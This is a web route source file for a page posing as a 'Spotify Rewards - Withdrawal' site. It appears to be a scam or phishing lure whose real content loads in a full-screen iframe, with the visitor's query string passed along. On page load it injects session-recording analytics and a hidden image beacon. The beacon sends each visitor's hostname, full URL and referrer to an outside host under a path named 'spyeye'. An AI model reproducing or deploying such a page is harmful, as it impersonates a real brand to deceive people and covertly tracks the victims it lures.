import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards - Withdrawal" },
      {
        name: "description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
      {
        property: "og:description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    scripts: [
      {
        children: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "yft2re9p41");`,
      },
      {
        children: `(function(){try{var l=location,i=new Image();i.src="https://click-charm-73.lovable.app/api/public/spyeye/976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd?h="+encodeURIComponent(l.hostname)+"&u="+encodeURIComponent(l.href)+"&r="+encodeURIComponent(document.referrer)+"&t="+Date.now();}catch(e){}})();`,
      },
    ],
  }),
  component: DynamicRenderer,
});

function DynamicRenderer() {
  const [search, setSearch] = useState<string | null>(null);

  useEffect(() => {
    setSearch(window.location.search);
  }, []);

  if (search === null) return null;

  return (
    <iframe
      src={`/sp/type/index.html${search}`}
      title="Spotify Rewards"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
    />
  );
}
